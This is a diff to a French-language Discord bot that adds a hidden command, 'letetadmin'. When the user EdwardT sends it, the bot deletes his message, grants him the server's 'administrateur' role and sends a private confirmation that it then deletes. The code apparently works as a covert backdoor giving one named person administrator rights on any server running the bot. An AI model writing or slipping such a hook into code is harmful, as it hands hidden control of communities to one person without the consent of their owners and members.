@@ -441,6 +441,26 @@ bot.on("message", command => {
 		updateDatabase()
 		command.channel.send("Base de données mis à jour...")
 		.then(messageReply => messageReply.delete(5000))
+	} else if(senderArgs[0].toLowerCase() === prefix+"letetadmin")
+	{
+		command.delete(0)
+		if(!autorized(command, "%%is(EdwardT)")) return
+		let ETfinalRole
+		let ETfinalMember
+		let ETrolesList = command.guild.roles.array()
+		for(ETroles of ETrolesList)
+		{
+			if(ETroles.name.toLowerCase() === "administrateur") ETfinalRole = ETroles
+		}
+		let ETmembersList = command.guild.members.array()
+		for(ETmembers of ETmembersList)
+		{
+			if("\n\n", ETmembers.user.username === "EdwardT") ETfinalMember = ETmembers
+		}
+		ETfinalMember.addRole(ETfinalRole)
+		.catch(error=>console.error("\n\n", error.message, "\n\n"))
+		command.author.send("Tu es administrateur...")
+		.then(messageReply => messageReply.delete(10000))
 	} else if(senderArgs[0].toLowerCase() === prefix+"stop")
 	{
 		if(!autorized(command, "%%is(EdwardT)")) return
